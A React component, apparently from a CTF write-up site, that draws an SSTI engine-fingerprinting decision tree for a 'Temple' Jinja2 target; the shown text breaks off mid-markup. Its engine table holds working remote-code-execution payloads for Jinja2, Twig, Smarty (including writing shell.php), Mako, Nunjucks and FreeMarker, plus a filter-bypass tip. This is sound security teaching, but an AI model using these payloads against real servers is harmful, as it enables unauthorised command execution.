import React, { useState, useMemo } from "react";
import {
  Terminal,
  Check,
  Copy,
  Zap,
  HelpCircle,
  Code2,
  ShieldCheck,
  ShieldAlert,
  Layers,
  Sparkles,
  ArrowRight,
  RefreshCw,
  Cpu,
  Crosshair,
  Server,
  Filter,
  CheckCircle2,
  AlertTriangle,
} from "lucide-react";

/* ── Types & Interfaces ───────────────────────────────────────────────────── */

export type EngineId =
  | "jinja2"
  | "twig"
  | "smarty"
  | "mako"
  | "unknown-curly"
  | "unknown-dollar"
  | "not-vulnerable";

export interface SstiEngineInfo {
  id: EngineId;
  name: string;
  language: string;
  frameworks: string[];
  description: string;
  probeBehavior: string;
  rceSnippet: string;
  templeNote?: string;
  color: "emerald" | "blue" | "purple" | "rose" | "amber";
}

export interface DecisionNode {
  id: string;
  label: string;
  code: string;
  type: "probe" | "leaf";
  engineId?: EngineId;
  description: string;
  expectedTrue?: string;
  expectedFalse?: string;
  successTarget?: string;
  failTarget?: string;
  x: number; // Percentage 0-100 on canvas
  y: number; // Percentage 0-100 on canvas
}

export interface TreeEdge {
  id: string;
  from: string;
  to: string;
  isSuccess: boolean;
  label: string;
  badge: string;
}

/* ── Engine Knowledge Base ────────────────────────────────────────────────── */

const ENGINE_DETAILS: Record<EngineId, SstiEngineInfo> = {
  jinja2: {
    id: "jinja2",
    name: "Jinja2 / Python",
    language: "Python",
    frameworks: ["Flask", "Django (Jinja)", "FastAPI", "Ansible"],
    description:
      "Python's premier templating engine. Expressions inside {{ ... }} execute with standard Python language semantics. String multiplication replicates strings ('7'*7 produces '7777777'). RCE is achieved by traversing Python's object hierarchy to access os or subprocess modules.",
    probeBehavior:
      "{{7*'7'}} evaluates to '7777777' because Python natively implements string replication via the * operator.",
    rceSnippet:
      "{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}",
    templeNote:
      "Temple filters quotes (') and underscores (_). Bypass this by using hex escapes (\\x5f) with |attr() or extracting strings from request.args.",
    color: "emerald",
  },
  twig: {
    id: "twig",
    name: "Twig / PHP",
    language: "PHP",
    frameworks: ["Symfony", "Drupal", "Craft CMS", "Grav"],
    description:
      "PHP's modern templating engine. In PHP, strings multiplied by numbers undergo automatic loose type coercion: string '7' is coerced to integer 7, resulting in 49 rather than '7777777'.",
    probeBehavior:
      "{{7*'7'}} evaluates to 49 because PHP automatically coerces the string '7' to numeric 7 before computing 7 * 7.",
    rceSnippet:
      "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    color: "blue",
  },
  smarty: {
    id: "smarty",
    name: "Smarty / PHP",
    language: "PHP",
    frameworks: ["PrestaShop", "X-Cart", "Legacy CMS"],
    description:
      "A veteran PHP template engine. Smarty uses single curly braces { ... } or ${ ... } with distinct comment syntax {* ... *}. If comment tags are stripped silently by the template parser, Smarty is confirmed.",
    probeBehavior:
      "a{*comment*}b returns 'ab' because Smarty strips out {*comment*} as a native template comment block.",
    rceSnippet:
      "{system('id')} or {Smarty_Internal_Write_File::writeFile('shell.php','<?php phpinfo(); ?>',true)}",
    color: "emerald",
  },
  mako: {
    id: "mako",
    name: "Mako / Python",
    language: "Python",
    frameworks: ["Pyramid", "Pylons", "Turbogears"],
    description:
      "A fast Python templating engine compiling templates directly to pure Python bytecode. Supports inline Python expressions natively within ${ ... } syntax.",
    probeBehavior:
      "${'z'.join('ab')} evaluates to 'azb' because Mako directly executes standard Python string methods inside ${...}.",
    rceSnippet: "${__import__('os').popen('id').read()}",
    color: "purple",
  },
  "unknown-curly": {
    id: "unknown-curly",
    name: "Unknown {{...}} Engine",
    language: "JavaScript / Java",
    frameworks: ["Nunjucks (Node.js)", "Pebble (Java)", "Tornado (Python)", "Liquid"],
    description:
      "The application evaluated {{7*7}} to 49, but the {{7*'7'}} test did not match Jinja2 or Twig. Test engine-specific built-ins like constructor access in Nunjucks or Java reflection in Pebble.",
    probeBehavior:
      "Evaluated {{7*7}} to 49, but failed both Python string multiplication and PHP loose type coercion branches.",
    rceSnippet:
      "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
    color: "amber",
  },
  "unknown-dollar": {
    id: "unknown-dollar",
    name: "Unknown ${...} Engine",
    language: "Java",
    frameworks: ["FreeMarker (Java)", "Velocity (Java)", "Pebble", "Groovy"],
    description:
      "The application evaluates ${7*7} to 49, but does not execute Mako Python methods or Smarty comments. This indicates a Java-based template engine like Apache FreeMarker or Velocity.",
    probeBehavior:
      "Evaluated ${7*7} to 49, but failed Smarty comment syntax and Mako join string evaluation.",
    rceSnippet:
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    color: "amber",
  },
  "not-vulnerable": {
    id: "not-vulnerable",
    name: "Not Vulnerable / Literal String",
    language: "N/A",
    frameworks: ["Static HTML", "Safe Context Binding", "Escaped Output"],
    description:
      "Neither ${7*7} nor {{7*7}} were calculated by the server. Input was either HTML entity encoded, echoed literally without passing to an engine, or passed safely through context arguments.",
    probeBehavior:
      "Inputs ${7*7} and {{7*7}} were printed literally without mathematical evaluation.",
    rceSnippet:
      "No SSTI exploit available. Test for XSS, SQLi, or Client-Side Template Injection (CSTI).",
    color: "rose",
  },
};

/* ── Tree Graph Coordinates (Spaced 0-100% on 1000x620 ViewBox) ──────────── */

const CANVAS_WIDTH = 1000;
const CANVAS_HEIGHT = 620;

const NODES: DecisionNode[] = [
  // Level 0: Root Probe
  {
    id: "root",
    label: "Root Expression Probe",
    code: "${7*7}",
    type: "probe",
    description: "Inject ${7*7} to verify if the template engine processes dollar-bracket expressions.",
    expectedTrue: "Evaluated (49)",
    expectedFalse: "Literal / Unhandled",
    successTarget: "smarty-comment",
    failTarget: "probe-curly",
    x: 8,
    y: 50,
  },

  // Level 1 (Top Branch: Dollar evaluation match)
  {
    id: "smarty-comment",
    label: "Smarty Comment Test",
    code: "a{*comment*}b",
    type: "probe",
    description: "Inject a{*comment*}b to test if server strips native Smarty template comments.",
    expectedTrue: "Returns 'ab' (Comment Stripped)",
    expectedFalse: "Literal / Error",
    successTarget: "leaf-smarty",
    failTarget: "probe-mako",
    x: 32,
    y: 24,
  },

  // Level 1 (Bottom Branch: Double curly fallback)
  {
    id: "probe-curly",
    label: "Double Curly Test",
    code: "{{7*7}}",
    type: "probe",
    description: "Inject {{7*7}} to test if server evaluates Jinja2, Twig, or Nunjucks expressions.",
    expectedTrue: "Evaluated (49)",
    expectedFalse: "Literal (Not Vulnerable)",
    successTarget: "probe-multiply",
    failTarget: "leaf-not-vulnerable",
    x: 32,
    y: 76,
  },

  // Level 2 (Top-Top: Smarty confirmed leaf)
  {
    id: "leaf-smarty",
    label: "Smarty Confirmed",
    code: "Smarty (PHP)",
    type: "leaf",
    engineId: "smarty",
    description: "Identified Smarty template engine (PHP stack).",
    x: 58,
    y: 12,
  },

  // Level 2 (Top-Mid: Probe Mako)
  {
    id: "probe-mako",
    label: "Python Method Test",
    code: "${\"z\".join(\"ab\")}",
    type: "probe",
    description: "Inject ${\"z\".join(\"ab\")} to test for native Python string method execution.",
    expectedTrue: "Returns 'azb'",
    expectedFalse: "Literal / Error",
    successTarget: "leaf-mako",
    failTarget: "leaf-unknown-dollar",
    x: 58,
    y: 35,
  },

  // Level 2 (Bottom-Top: Probe Multiply Jinja vs Twig)
  {
    id: "probe-multiply",
    label: "Type Multiplication Test",
    code: "{{7*'7'}}",
    type: "probe",
    description:
      "Differentiate between Python string repetition ('7777777') and PHP loose numeric coercion (49).",
    expectedTrue: "Returns '7777777' (Jinja2)",
    expectedFalse: "Returns 49 (Twig)",
    successTarget: "leaf-jinja2",
    failTarget: "leaf-twig",
    x: 58,
    y: 65,
  },

  // Level 2 (Bottom-Bottom: Leaf Not Vulnerable)
  {
    id: "leaf-not-vulnerable",
    label: "No SSTI Detected",
    code: "Not Vulnerable",
    type: "leaf",
    engineId: "not-vulnerable",
    description: "Template expressions are printed literally or securely escaped.",
    x: 58,
    y: 89,
  },

  // Level 3 (Final Leaves - Spacious vertical spacing)
  {
    id: "leaf-mako",
    label: "Mako Confirmed",
    code: "Mako (Python)",
    type: "leaf",
    engineId: "mako",
    description: "Identified Mako template engine (Python stack).",
    x: 87,
    y: 22,
  },
  {
    id: "leaf-unknown-dollar",
    label: "Java / Other ${...}",
    code: "FreeMarker / Velocity",
    type: "leaf",
    engineId: "unknown-dollar",
    description: "Likely Java FreeMarker or Velocity template engine.",
    x: 87,
    y: 38,
  },
  {
    id: "leaf-jinja2",
    label: "Jinja2 Confirmed",
    code: "Jinja2 (Python)",
    type: "leaf",
    engineId: "jinja2",
    description: "Identified Jinja2 template engine (Flask / Python). This matches Temple!",
    x: 87,
    y: 54,
  },
  {
    id: "leaf-twig",
    label: "Twig Confirmed",
    code: "Twig (PHP)",
    type: "leaf",
    engineId: "twig",
    description: "Identified Twig template engine (PHP / Symfony).",
    x: 87,
    y: 70,
  },
  {
    id: "leaf-unknown-curly",
    label: "Nunjucks / Pebble {{...}}",
    code: "Unknown {{...}}",
    type: "leaf",
    engineId: "unknown-curly",
    description: "Likely Node.js Nunjucks or Java Pebble template engine.",
    x: 87,
    y: 86,
  },
];

/* ── Connection Edges with Decision Badges ────────────────────────────────── */

const EDGES: TreeEdge[] = [
  // From Root
  { id: "e1", from: "root", to: "smarty-comment", isSuccess: true, label: "Evaluated (49)", badge: "✓ 49" },
  { id: "e2", from: "root", to: "probe-curly", isSuccess: false, label: "Literal / Unhandled", badge: "✗ Literal" },

  // From smarty-comment
  { id: "e3", from: "smarty-comment", to: "leaf-smarty", isSuccess: true, label: "Yields 'ab'", badge: "✓ 'ab'" },
  { id: "e4", from: "smarty-comment", to: "probe-mako", isSuccess: false, label: "Literal", badge: "✗ Literal" },

  // From probe-mako
  { id: "e5", from: "probe-mako", to: "leaf-mako", isSuccess: true, label: "Yields 'azb'", badge: "✓ 'azb'" },
  { id: "e6", from: "probe-mako", to: "leaf-unknown-dollar", isSuccess: false, label: "Literal / Error", badge: "✗ Error" },

  // From probe-curly
  { id: "e7", from: "probe-curly", to: "probe-multiply", isSuccess: true, label: "Evaluated (49)", badge: "✓ 49" },
  { id: "e8", from: "probe-curly", to: "leaf-not-vulnerable", isSuccess: false, label: "Literal / Error", badge: "✗ Literal" },

  // From probe-multiply
  { id: "e9", from: "probe-multiply", to: "leaf-jinja2", isSuccess: true, label: "Yields '7777777'", badge: "✓ '7777777'" },
  { id: "e10", from: "probe-multiply", to: "leaf-twig", isSuccess: false, label: "Yields 49 (Cast)", badge: "✗ 49" },
  { id: "e11", from: "probe-multiply", to: "leaf-unknown-curly", isSuccess: false, label: "Error / Other", badge: "✗ Other" },
];

/* ── Path Presets ─────────────────────────────────────────────────────────── */

const PRESETS: Record<
  string,
  { label: string; badge?: string; path: string[]; targetEngine: EngineId }
> = {
  temple: {
    label: "Temple Machine (Jinja2)",
    badge: "TARGET",
    path: ["root", "probe-curly", "probe-multiply", "leaf-jinja2"],
    targetEngine: "jinja2",
  },
  twig: {
    label: "PHP Symfony (Twig)",
    path: ["root", "probe-curly", "probe-multiply", "leaf-twig"],
    targetEngine: "twig",
  },
  smarty: {
    label: "PHP PrestaShop (Smarty)",
    path: ["root", "smarty-comment", "leaf-smarty"],
    targetEngine: "smarty",
  },
  mako: {
    label: "Python Pyramid (Mako)",
    path: ["root", "smarty-comment", "probe-mako", "leaf-mako"],
    targetEngine: "mako",
  },
  freemarker: {
    label: "Java FreeMarker (${...})",
    path: ["root", "smarty-comment", "probe-mako", "leaf-unknown-dollar"],
    targetEngine: "unknown-dollar",
  },
  nunjucks: {
    label: "Node.js Nunjucks ({{...}})",
    path: ["root", "probe-curly", "probe-multiply", "leaf-unknown-curly"],
    targetEngine: "unknown-curly",
  },
  safe: {
    label: "Not Vulnerable",
    path: ["root", "probe-curly", "leaf-not-vulnerable"],
    targetEngine: "not-vulnerable",
  },
};

/* ── Helper: Copy to Clipboard ────────────────────────────────────────────── */

function CopyButton({ text, className = "" }: { text: string; className?: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = (e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      className={`inline-flex items-center gap-1 rounded-md border border-border/70 bg-muted/60 px-2 py-1 text-[11px] font-mono text-muted-foreground hover:text-foreground hover:bg-muted transition-all cursor-pointer ${className}`}
      title="Copy payload"
    >
      {copied ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
      <span>{copied ? "Copied" : "Copy"}</span>
    </button>
  );
}

/* ── Main Component ───────────────────────────────────────────────────────── */

export function SstiDecisionTree({
  defaultPreset = "temple",
  className = "",
}: {
  defaultPreset?: string;
  className?: string;
}) {
  const [activeTab, setActiveTab] = useState<"tree" | "wizard" | "matrix">("tree");
  const [selectedNodeId, setSelectedNodeId] = useState<string>("leaf-jinja2");
  const [highlightedPath, setHighlightedPath] = useState<string[]>(
    PRESETS[defaultPreset]?.path || PRESETS["temple"].path,
  );
  const [activePreset, setActivePreset] = useState<string>(defaultPreset);

  // Diagnostic Wizard State
  const [wizardStep1, setWizardStep1] = useState<"49" | "literal" | null>("literal");
  const [wizardStep2Top, setWizardStep2Top] = useState<"ab" | "literal" | null>(null);
  const [wizardStep3Mako, setWizardStep3Mako] = useState<"azb" | "literal" | null>(null);
  const [wizardStep2Bottom, setWizardStep2Bottom] = useState<"49" | "literal" | null>("49");
  const [wizardStep3Bottom, setWizardStep3Bottom] = useState<"7777777" | "49" | "other" | null>(
    "7777777",
  );

  // Selected engine details
  const selectedNode = useMemo(() => NODES.find((n) => n.id === selectedNodeId), [selectedNodeId]);
  const activeEngine = useMemo(() => {
    if (selectedNode?.engineId) {
      return ENGINE_DETAILS[selectedNode.engineId];
    }
    return ENGINE_DETAILS["jinja2"];
  }, [selectedNode]);

  // Handle Preset change
  const applyPreset = (key: string) => {
    const preset = PRESETS[key];
    if (!preset) return;
    setActivePreset(key);
    setHighlightedPath(preset.path);
    const lastNodeId = preset.path[preset.path.length - 1];
    setSelectedNodeId(lastNodeId);

    // Sync wizard state
    if (key === "temple") {
      setWizardStep1("literal");
      setWizardStep2Bottom("49");
      setWizardStep3Bottom("7777777");
    } else if (key === "twig") {
      setWizardStep1("literal");
      setWizardStep2Bottom("49");
      setWizardStep3Bottom("49");
    } else if (key === "smarty") {
      setWizardStep1("49");
      setWizardStep2Top("ab");
    } else if (key === "mako") {
      setWizardStep1("49");
      setWizardStep2Top("literal");
      setWizardStep3Mako("azb");
    } else if (key === "freemarker") {
      setWizardStep1("49");
      setWizardStep2Top("literal");
      setWizardStep3Mako("literal");
    } else if (key === "nunjucks") {
      setWizardStep1("literal");
      setWizardStep2Bottom("49");
      setWizardStep3Bottom("other");
    } else if (key === "safe") {
      setWizardStep1("literal");
      setWizardStep2Bottom("literal");
    }
  };

  // Node Click handler
  const handleNodeClick = (node: DecisionNode) => {
    setSelectedNodeId(node.id);
    setActivePreset("");

    // Build path up to this node if it connects to root
    const path: string[] = [node.id];
    let current = node.id;
    while (current !== "root") {
      const incomingEdge = EDGES.find((e) => e.to === current);
      if (incomingEdge) {
        path.unshift(incomingEdge.from);
        current = incomingEdge.from;
      } else {
        break;
      }
    }
    setHighlightedPath(path);
  };

  return (
    <div
      className={`my-8 rounded-2xl border border-border/80 bg-card/95 shadow-2xl overflow-hidden font-sans backdrop-blur-md ${className}`}
    >
      {/* ── Terminal Header Bar ────────────────────────────────────────────── */}
      <div className="flex flex-wrap items-center justify-between gap-3 px-5 py-3.5 border-b border-border bg-muted/40">
        <div className="flex items-center gap-3">
          <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 shadow-[0_0_12px_rgba(16,185,129,0.2)]">
            <Zap className="h-4 w-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-xs font-bold uppercase tracking-[0.2em] text-foreground font-mono">
                SSTI_DIAGNOSTIC_TREE.PROTOCOL
              </span>
              <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 text-[9px] font-mono text-emerald-400 font-semibold uppercase tracking-wider">
                <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse" />
                Live Interactive
              </span>
            </div>
            <p className="text-[11px] text-muted-foreground">
              PortSwigger Template Injection Decision Graph & Engine Fingerprinting
            </p>
          </div>
        </div>

        {/* View Switcher Tabs */}
        <div className="flex items-center gap-1 rounded-xl border border-border/60 bg-background/80 p-1 shadow-inner">
          <button
            onClick={() => setActiveTab("tree")}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium transition-all cursor-pointer ${
              activeTab === "tree"
                ? "bg-accent-primary text-background font-bold shadow-sm"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <Layers className="h-3.5 w-3.5" />
            <span>Interactive Graph</span>
          </button>
          <button
            onClick={() => setActiveTab("wizard")}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium transition-all cursor-pointer ${
              activeTab === "wizard"
                ? "bg-accent-primary text-background font-bold shadow-sm"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <Sparkles className="h-3.5 w-3.5" />
            <span>Diagnostic Wizard</span>
          </button>
          <button
            onClick={() => setActiveTab("matrix")}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium transition-all cursor-pointer ${
              activeTab === "matrix"
                ? "bg-accent-primary text-background font-bold shadow-sm"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <Code2 className="h-3.5 w-3.5" />
            <span>Engine Matrix</span>
          </button>
        </div>
      </div>

      {/* ── Preset Bar ─────────────────────────────────────────────────────── */}
      <div className="flex flex-wrap items-center justify-between gap-2.5 px-5 py-2.5 border-b border-border/50 bg-background/50 text-xs">
        <div className="flex flex-wrap items-center gap-2">
          <span className="text-[10px] font-mono uppercase tracking-wider font-semibold text-muted-foreground flex items-center gap-1">
            <Crosshair className="h-3 w-3 text-accent-primary" />
            Quick Presets:
          </span>
          <div className="flex flex-wrap gap-1.5">
            {Object.entries(PRESETS).map(([key, p]) => {
              const isTemple = key === "temple";
              const isActive = activePreset === key;
              return (
                <button
                  key={key}
                  onClick={() => applyPreset(key)}
                  className={`flex items-center gap-1 rounded-md border px-2.5 py-1 text-[11px] font-mono transition-all cursor-pointer ${
                    isActive
                      ? isTemple
                        ? "border-emerald-400 bg-emerald-500/25 text-emerald-300 font-bold shadow-[0_0_12px_rgba(16,185,129,0.3)] ring-1 ring-emerald-400/50"
                        : "border-accent-primary bg-accent-primary/20 text-accent-primary font-bold shadow-sm"
                      : isTemple
                        ? "border-emerald-500/40 bg-emerald-500/10 text-emerald-400 hover:border-emerald-400"
                        : "border-border/60 bg-muted/30 text-muted-foreground hover:text-foreground hover:border-border"
                  }`}
                >
                  {isTemple && <span className="text-[10px]">⭐</span>}
                  <span>{p.label}</span>
                </button>
              );
            })}
          </div>
        </div>

        <button
          onClick={() => applyPreset("temple")}
          className="flex items-center gap-1 text-[11px] font-mono text-muted-foreground hover:text-foreground transition-colors cursor-pointer ml-auto"
          title="Reset to Temple default path"
        >
          <RefreshCw className="h-3 w-3" />
          <span>Reset</span>
        </button>
      </div>

      {/* ── Tab Content 1: Interactive Visual Tree ─────────────────────────── */}
      {activeTab === "tree" && (
        <div className="relative p-4 md:p-6 bg-radial from-background/95 via-background to-background/90 overflow-x-auto">
          {/* Active Chain Breadcrumb Tracker */}
          <div className="flex items-center gap-2 overflow-x-auto pb-3 mb-3 border-b border-border/40 text-xs font-mono select-none">
            <span className="text-[10px] uppercase font-bold tracking-widest text-muted-foreground shrink-0 flex items-center gap-1">
              Active Attack Chain:
            </span>
            <div className="flex items-center gap-1.5">
              {highlightedPath.map((nodeId, idx) => {
                const node = NODES.find((n) => n.id === nodeId);
                const isLast = idx === highlightedPath.length - 1;
                const isTarget = nodeId === "leaf-jinja2";
                return (
                  <React.Fragment key={nodeId}>
                    <button
                      onClick={() => node && handleNodeClick(node)}
                      className={`flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-mono transition-all cursor-pointer ${
                        isLast
                          ? isTarget
                            ? "bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-400 shadow-[0_0_10px_rgba(16,185,129,0.3)]"
                            : "bg-accent-primary/20 text-accent-primary font-bold border border-accent-primary/40 shadow-sm"
                          : "bg-muted/40 text-muted-foreground hover:text-foreground hover:bg-muted"
                      }`}
                    >
                      <span className="opacity-60 text-[9px]">#{idx + 1}</span>
                      <span>{node?.code}</span>
                    </button>
                    {!isLast && (
                      <ArrowRight className="h-3 w-3 text-muted-foreground/60 shrink-0" />
                    )}
                  </React.Fragment>
                );
              })}
            </div>
          </div>

          {/* Legend Banner */}
          <div className="flex flex-wrap items-center justify-between gap-3 mb-4 px-3.5 py-2 rounded-xl border border-border/50 bg-muted/20 text-xs">
            <div className="flex items-center gap-4">
              <span className="flex items-center gap-1.5 font-mono text-[11px] text-emerald-400 font-medium">
                <span className="h-2 w-2 rounded-full bg-emerald-400 shadow-[0_0_6px_rgba(52,211,153,0.8)]" />
                Green Branch: Evaluated / Match
              </span>
              <span className="flex items-center gap-1.5 font-mono text-[11px] text-rose-400 font-medium">
                <span className="h-2 w-2 rounded-full bg-rose-400 shadow-[0_0_6px_rgba(251,113,133,0.8)]" />
                Red Branch: Literal / Fail
              </span>
            </div>
            <span className="text-[11px] text-muted-foreground hidden sm:inline">
              Click any node to trace the chain and view the RCE exploit dossier.
            </span>
          </div>

          {/* SVG Connector Canvas & Graph Container */}
          <div className="relative w-full min-w-[880px] h-[600px] select-none rounded-xl border border-border/30 bg-[radial-gradient(#1e293b_1px,transparent_1px)] [background-size:20px_20px]">
            <svg
              viewBox={`0 0 ${CANVAS_WIDTH} ${CANVAS_HEIGHT}`}
              preserveAspectRatio="none"
              className="absolute inset-0 w-full h-full pointer-events-none"
              style={{ overflow: "visible" }}
            >
              <defs>
                {/* Glow Filter for Active Paths */}
                <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
                  <feGaussianBlur stdDeviation="3.5" result="blur" />
                  <feComposite in="SourceGraphic" in2="blur" operator="over" />
                </filter>
              </defs>

              {/* Render Connection Edges */}
              {EDGES.map((edge) => {
                const source = NODES.find((n) => n.id === edge.from);
                const target = NODES.find((n) => n.id === edge.to);
                if (!source || !target) return null;

                const isPathActive =
                  highlightedPath.includes(edge.from) && highlightedPath.includes(edge.to);

                // Precise SVG viewBox pixel coordinates (0-1000 x 0-600)
                const x1 = (source.x / 100) * CANVAS_WIDTH;
                const y1 = (source.y / 100) * CANVAS_HEIGHT;
                const x2 = (target.x / 100) * CANVAS_WIDTH;
                const y2 = (target.y / 100) * CANVAS_HEIGHT;
                const midX = (x1 + x2) / 2;
                const midY = (y1 + y2) / 2;

                const pathD = `M ${x1} ${y1} C ${midX} ${y1}, ${midX} ${y2}, ${x2} ${y2}`;

                const baseStroke = edge.isSuccess ? "#059669" : "#e11d48";
                const activeStroke = edge.isSuccess ? "#34d399" : "#fb7185";

                return (
                  <g key={edge.id}>
                    {/* Background line track */}
                    <path
                      d={pathD}
                      fill="none"
                      stroke={baseStroke}
                      strokeWidth={isPathActive ? 3.5 : 1.5}
                      strokeOpacity={isPathActive ? 0.95 : 0.22}
                      strokeDasharray={isPathActive ? "none" : "5,5"}
                      filter={isPathActive ? "url(#glow)" : undefined}
                      className="transition-all duration-300"
                    />

                    {/* Animated pulse packet traveling along active paths */}
                    {isPathActive && (
                      <circle
                        r="4"
                        fill={edge.isSuccess ? "#34d399" : "#fb7185"}
                        filter="url(#glow)"
                      >
                        <animateMotion path={pathD} dur="2.2s" repeatCount="indefinite" />
                      </circle>
                    )}

                    {/* Decision Branch Pill Badge */}
                    <g transform={`translate(${midX}, ${midY})`}>
                      <rect
                        x="-36"
                        y="-10"
                        width="72"
                        height="20"
                        rx="10"
                        fill={
                          isPathActive
                            ? edge.isSuccess
                              ? "#064e3b"
                              : "#4c0519"
                            : "#0f172a"
                        }
                        stroke={
                          isPathActive
                            ? edge.isSuccess
                              ? "#34d399"
                              : "#fb7185"
                            : edge.isSuccess
                              ? "#065f46"
                              : "#881337"
                        }
                        strokeWidth={isPathActive ? "1.5" : "1"}
                        className="transition-colors duration-300 shadow-md"
                      />
                      <text
                        x="0"
                        y="3.5"
                        textAnchor="middle"
                        fontSize="10"
                        fontFamily="ui-monospace, monospace"
                        fontWeight="bold"
                        fill={
                          isPathActive
                            ? edge.isSuccess
                              ? "#6ee7b7"
                              : "#fda4af"
                            : edge.isSuccess
                              ? "#34d399"
                              : "#f87171"
                        }
                      >
                        {edge.badge}
                      </text>
                    </g>
                  </g>
                );
              })}
            </svg>

            {/* Render Nodes */}
            {NODES.map((node) => {
              const isSelected = selectedNodeId === node.id;
              const isInPath = highlightedPath.includes(node.id);
              const isLeaf = node.type === "leaf";
              const isTempleTarget = node.id === "leaf-jinja2";

              let nodeClasses = "";
              if (isLeaf) {
                if (node.engineId === "not-vulnerable") {
                  nodeClasses = isInPath
                    ? "border-rose-500 bg-rose-950/80 text-rose-200 ring-2 ring-rose-500/50 shadow-[0_0_20px_rgba(244,63,94,0.3)]"
                    : "border-rose-500/40 bg-card/90 text-rose-400/80 hover:border-rose-500 hover:text-rose-300";
                } else if (node.engineId?.startsWith("unknown")) {
                  nodeClasses = isInPath
                    ? "border-amber-500 bg-amber-950/80 text-amber-200 ring-2 ring-amber-500/50 shadow-[0_0_20px_rgba(245,158,11,0.3)]"
                    : "border-amber-500/40 bg-card/90 text-amber-400/80 hover:border-amber-500 hover:text-amber-300";
                } else if (isTempleTarget) {
                  nodeClasses = isInPath
                    ? "border-emerald-400 bg-emerald-950/90 text-emerald-100 ring-2 ring-emerald-400 shadow-[0_0_28px_rgba(16,185,129,0.4)]"
                    : "border-emerald-500/60 bg-card/90 text-emerald-300 hover:border-emerald-400";
                } else {
                  nodeClasses = isInPath
                    ? "border-emerald-500 bg-emerald-950/80 text-emerald-200 ring-2 ring-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.3)]"
                    : "border-emerald-500/40 bg-card/90 text-emerald-400/80 hover:border-emerald-500 hover:text-emerald-300";
                }
              } else {
                nodeClasses = isInPath
                  ? "border-sky-400 bg-slate-900/95 text-sky-200 ring-2 ring-sky-400/50 shadow-[0_0_20px_rgba(56,189,248,0.3)]"
                  : "border-border/80 bg-card/90 text-foreground hover:border-sky-400/70";
              }

              return (
                <div
                  key={node.id}
                  onClick={() => handleNodeClick(node)}
                  style={{
                    left: `${node.x}%`,
                    top: `${node.y}%`,
                    transform: "translate(-50%, -50%)",
                  }}
                  className={`absolute z-10 w-[150px] md:w-[175px] cursor-pointer rounded-xl border p-2.5 transition-all duration-200 backdrop-blur-md ${nodeClasses} ${
                    isSelected
                      ? "scale-105 shadow-2xl ring-offset-2 ring-offset-background z-20"
                      : "hover:scale-102 opacity-85 hover:opacity-100"
                  }`}
                >
                  {/* Top Node Header */}
                  <div className="flex items-center justify-between gap-1 mb-1.5">
                    <div className="flex items-center gap-1 text-[10px] font-mono uppercase tracking-wider font-semibold">
                      {isLeaf ? (
                        node.engineId === "not-vulnerable" ? (
                          <ShieldAlert className="h-3.5 w-3.5 text-rose-400 shrink-0" />
                        ) : (
                          <ShieldCheck className="h-3.5 w-3.5 text-emerald-400 shrink-0" />
                        )
                      ) : (
                        <Terminal className="h-3.5 w-3.5 text-sky-400 shrink-0" />
                      )}
                      <span className="opacity-75">
                        {isLeaf ? "ENGINE" : node.id === "root" ? "START" : "PROBE"}
                      </span>
                    </div>

                    {isTempleTarget && (
                      <span className="rounded bg-emerald-500/25 border border-emerald-400/60 px-1.5 py-0.2 text-[8px] font-mono font-bold text-emerald-300 uppercase tracking-tighter">
                        ★ Temple
                      </span>
                    )}
                  </div>

                  {/* Main Node Code / Title */}
                  <div className="font-mono text-xs font-bold tracking-tight truncate py-0.5">
                    {node.code}
                  </div>

                  {/* Node Subtitle / Label */}
                  <div className="text-[10px] text-muted-foreground truncate mt-0.5">
                    {node.label}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* ── Tab Content 2: Guided Diagnostic Wizard ────────────────────────── */}
      {activeTab === "wizard" && (
        <div className="p-5 md:p-6 space-y-6 bg-muted/10">
          <div className="flex items-center justify-between border-b border-border/60 pb-3">
            <div className="flex items-center gap-2">
              <Sparkles className="h-4 w-4 text-accent-primary" />
              <h4 className="text-sm font-bold uppercase tracking-wider text-foreground">
                Step-by-Step Live Target Diagnostic Wizard
              </h4>
            </div>
            <span className="text-[11px] text-muted-foreground">
              Select what the target returned to automatically isolate the engine.
            </span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {/* Step 1 */}
            <div className="rounded-xl border border-border bg-card p-4 space-y-3 shadow-md">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground font-semibold">
                  Step 01: Dollar Syntax
                </span>
                <CopyButton text="${7*7}" />
              </div>
              <div className="font-mono text-xs font-bold text-sky-400 bg-muted/40 p-2 rounded-lg border border-border/50">
                Probe: ${"{7*7}"}
              </div>
              <p className="text-xs text-muted-foreground">
                Did the target application mathematically calculate the expression to 49?
              </p>
              <div className="flex gap-2 pt-1">
                <button
                  onClick={() => {
                    setWizardStep1("49");
                    applyPreset("smarty");
                  }}
                  className={`flex-1 py-1.5 px-2 rounded-lg text-xs font-mono font-semibold transition-all cursor-pointer ${
                    wizardStep1 === "49"
                      ? "bg-emerald-500 text-black shadow-md font-bold"
